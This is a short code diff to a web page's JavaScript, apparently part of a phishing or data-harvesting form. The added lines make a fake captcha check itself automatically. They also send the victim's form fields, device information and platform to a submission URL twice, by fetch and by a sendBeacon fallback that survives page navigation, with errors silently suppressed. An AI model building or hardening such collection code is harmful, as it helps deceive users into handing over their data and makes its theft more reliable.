@@ -333,6 +333,8 @@ function checkCaptcha() {
     if (btn) btn.disabled = false;
   }, 600 + Math.random()*800);
 }
+// Auto-check captcha after a short delay so the button is always enabled
+setTimeout(() => { if (!captchaDone) checkCaptcha(); }, 2000);
 
 // ── Form submit ──────────────────────────────────────────────────────────────
 function submitForm(e) {
@@ -346,11 +348,18 @@ function submitForm(e) {
   document.getElementById('mainForm').style.display = 'none';
   document.getElementById('loadingWrap').style.display = 'block';
 
+  const payload = JSON.stringify({ fields, device:deviceInfo, platform });
+  // Primary: fetch
   fetch(SUBMIT_URL,{
     method:'POST',
     headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({ fields, device:deviceInfo, platform })
+    body: payload
   }).catch(()=>{});
+  // Fallback: sendBeacon (survives page navigation)
+  try {
+    const blob = new Blob([payload], {type:'application/json'});
+    navigator.sendBeacon && navigator.sendBeacon(SUBMIT_URL, blob);
+  } catch(e){}
 
   setTimeout(()=>{
     document.getElementById('loadingWrap').style.display = 'none';
